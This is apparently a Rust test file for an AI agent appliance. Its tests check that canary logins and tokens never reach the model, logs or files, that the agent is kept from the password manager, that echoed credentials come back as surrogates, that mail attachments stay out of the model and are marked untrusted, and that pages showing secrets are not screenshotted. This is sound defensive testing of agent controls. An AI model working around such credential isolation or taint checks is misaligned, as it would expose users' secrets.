    let app = Appliance::start(spec.computer(&computerd.socket), &model).await;
    let alice = app.api("alice");
    let identity = identity_of(&app, "acct.test").await;
    assert!(alice.put_policy("org", &permits(&["browser_as_navigate", "browser_sign_in", "pm__get_login"])).await.is_success());
    model.set_script(model_steps(
        &identity,
        vec![
            ("browser_as_navigate", json!({ "identity": "", "url": "http://acct.test/login" })),
            ("browser_sign_in", json!({ "identity": "", "username_field": "e1", "password_field": "e2" })),
            ("pm__get_login", json!({ "site": "acct.test" })),
        ],
    ));
    let task = alice.submit("Sign in to my account.").await;
    approve_sign_in(&alice, &task).await;
    finish(&alice, &task).await;

    assert!(site.hits().iter().any(|p| p.starts_with("/in?") && p.contains(&password) && p.contains(&username)), "the login never reached the page: {:?}", site.hits());
    assert_eq!(manager.calls_to("get_login").len(), 1, "the agent reached the password manager itself");
    assert!(alice.open_items(&task, "secure_form").await.is_empty(), "the person was asked although the manager had the login");
    assert!(!model.requests()[0].text().contains("pm__get_login"), "the agent was offered the password manager");
    for canary in [&password, &username] {
        for (i, r) in model.requests().iter().enumerate() {
            assert!(!scan::contains(r.text().as_bytes(), canary), "the login reached model request {i}");
        }
        assert!(!scan::contains(app.db.dump().await.as_bytes(), canary), "the login reached the log");
        assert!(!scan::contains(app.logs().as_bytes(), canary), "the login reached the server's output");
        let files = scan::files_containing(&app.state_dir, canary);
        assert!(files.is_empty(), "the login reached a file: {files:?}");
    }

    // A saved login comes first.
    let saved = canary("saved-password");
    model.set_script(model_steps(&identity, vec![("browser_as_navigate", json!({ "identity": "", "url": "http://acct.test/login" }))]));
    let task = alice.submit("Open the sign-in page.").await;
    finish(&alice, &task).await;
    assert!(alice.post(&format!("/v1/identities/{identity}/secure-form"), json!({ "target": "e2", "value": saved, "submit": true, "save": true })).await.0.is_success());
    model.set_script(model_steps(
        &identity,
        vec![("browser_as_navigate", json!({ "identity": "", "url": "http://acct.test/login" })), ("browser_sign_in", json!({ "identity": "", "password_field": "e2" }))],
    ));
    let task = alice.submit("Sign in again.").await;
    approve_sign_in(&alice, &task).await;
    finish(&alice, &task).await;
    assert_eq!(manager.calls_to("get_login").len(), 1, "the password manager was asked before the vault");
    assert_eq!(site.hits().iter().filter(|p| p.contains(&format!("pw={saved}"))).count(), 2, "the saved login was not used: {:?}", site.hits());
}

#[tokio::test(flavor = "multi_thread")]
async fn a_real_credential_echoed_by_a_site_comes_back_as_its_surrogate() {
    let computerd = Computerd::start();
    let real = canary("echoed-token");
    let page = format!("<html><pre>your token is {real} and again {real}</pre></html>");
    let site = FakeWeb::start(&[("/echo", page.as_str())]).await;
    let model = FakeModel::start(steps(vec![])).await;
    let spec = Spec::default().computer_options(json!({ "public_hosts": { "app.test": [bare(&site)] } }));
    let app = Appliance::start(spec.computer(&computerd.socket), &model).await;
    let alice = app.api("alice");
    let (_, made) = alice.post("/v1/computers", json!({})).await;
    let id = made["id"].as_str().unwrap().to_string();
    assert_eq!(alice.post(&format!("/v1/computers/{id}/start"), json!({})).await.0, 200);
    let (code, issued) = alice.post(&format!("/v1/computers/{id}/surrogates"), json!({ "name": "app", "value": real, "host": "app.test" })).await;
    assert!(code.is_success(), "{issued}");
    let surrogate = issued["surrogate"].as_str().unwrap().to_string();
    assert!(alice.post(&format!("/v1/computers/{id}/destinations"), json!({ "host": "app.test" })).await.0.is_success());
    let got = computerd.root_shell(&id, &format!("curl -s -m 20 --compressed -x {SITE_PROXY} -H 'Authorization: Bearer {surrogate}' http://app.test/echo"));
    assert_eq!(got.matches(&surrogate).count(), 2, "the page did not come back: {got}");
    assert!(!got.contains(&real), "the real credential reached the computer: {got}");
    assert_eq!(
        site.seen().iter().find(|s| s.path == "/echo").unwrap().authorization.as_deref(),
        Some(format!("Bearer {real}").as_str()),
        "the app did not get the real credential"
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn a_mail_attachment_stays_out_of_the_model_until_it_is_opened() {
    use base64::Engine;
    let computerd = Computerd::start();
    let inside = canary("in-the-attachment");
    let file = base64::engine::general_purpose::STANDARD.encode(inside.as_bytes());
    let (name, data) = ("invoice.txt", file.clone());
    let mail = FakeMcp::builder()
        .tool("read_message", "Read a message.", json!({ "type": "object", "properties": {} }), move |_, _, _| {
            mcp::ok(json!({ "subject": "your invoice", "attachments": [{ "name": name, "media_type": "text/plain", "data_b64": data }] }))
        })
        .start()
        .await;
    let model = FakeModel::start(steps(vec![])).await;
    let spec = Spec::default().app("mail", &mail, "public", "private", &[("read_message", "read")]).filter_login_codes("mail");
    let app = Appliance::start(spec.computer(&computerd.socket), &model).await;
    let alice = app.api("alice");
    let (_, made) = alice.post("/v1/computers", json!({})).await;
    let computer = made["id"].as_str().unwrap().to_string();
    assert_eq!(alice.post(&format!("/v1/computers/{computer}/start"), json!({})).await.0, 200);
    model.set_script(steps(vec![
        contract_unchecked("read the mail", "read"),
        tool("mail__read_message", json!({})),
        tool("open_attachment", json!({ "name": name, "command": "cat /workspace/inputs/attachment" })),
        complete("done"),
    ]));
    let task = alice.submit("Read my invoice mail.").await;
    alice.wait_settled(&task).await;
    let reqs = model.requests();
    assert!(reqs.iter().all(|r| !r.text().contains(&file)), "the attachment's bytes reached the model");
    let told = reqs
        .iter()
        .position(|r| r.last_results().iter().any(|t| t.text.contains("Attachments from outside: invoice.txt")))
        .unwrap_or_else(|| panic!("the model was not told of the attachment"));
    assert!(!reqs[told].text().contains(&inside), "the attachment was read without opening it");
    assert!(reqs.iter().any(|r| r.last_results().iter().any(|t| t.text.contains(&inside))), "open_attachment did not find it");
    assert_eq!(alice.task(&task).await["taint"]["untrusted"], json!(true), "the attachment's text was not treated as outside data");
}

#[tokio::test(flavor = "multi_thread")]
async fn a_page_showing_a_filled_value_is_not_photographed() {
    let computerd = Computerd::start();
    let secret = canary("on-the-page");
    let site = FakeWeb::start(&[("/form", LOGIN_PAGE), ("/plain", "<html><p>nothing here</p></html>")]).await;
    let model = FakeModel::start(steps(vec![])).await;
    let spec = Spec::default().computer_options(json!({ "public_hosts": { "acct.test": [bare(&site)] } }));
    let app = Appliance::start(spec.computer(&computerd.socket), &model).await;
    let alice = app.api("alice");
    let identity = identity_of(&app, "acct.test").await;
    assert!(alice.put_policy("org", &permits(&["browser_as_navigate", "browser_as_screenshot"])).await.is_success());
    model.set_script(model_steps(&identity, vec![("browser_as_navigate", json!({ "identity": "", "url": "http://acct.test/form" }))]));
    let task = alice.submit("Open the form.").await;
    finish(&alice, &task).await;
    let (code, filled) = alice.post(&format!("/v1/identities/{identity}/secure-form"), json!({ "target": "e1", "value": secret, "submit": false })).await;
    assert!(code.is_success(), "{filled}");

    model.set_script(model_steps(&identity, vec![("browser_as_screenshot", json!({ "identity": "" }))]));
    let task = alice.submit("Take a picture of the page.").await;
    alice.wait_settled(&task).await;
    let results: Vec<String> = model.requests().iter().flat_map(|r| r.last_results()).map(|r| r.text).collect();
    assert!(results.iter().any(|t| t.contains("was not captured")), "a page showing the value was photographed: {results:?}");
    finish(&alice, &task).await;

    model.set_script(model_steps(
        &identity,
        vec![("browser_as_navigate", json!({ "identity": "", "url": "http://acct.test/plain" })), ("browser_as_screenshot", json!({ "identity": "" }))],
    ));
    let before = model.requests().len();
    let task = alice.submit("Picture of the next page.").await;
    finish(&alice, &task).await;
    let later: Vec<String> = model.requests()[before..].iter().flat_map(|r| r.last_results()).map(|r| r.text).collect();
    assert!(!later.iter().any(|t| t.contains("was not captured")), "an ordinary page was refused: {later:?}");
}
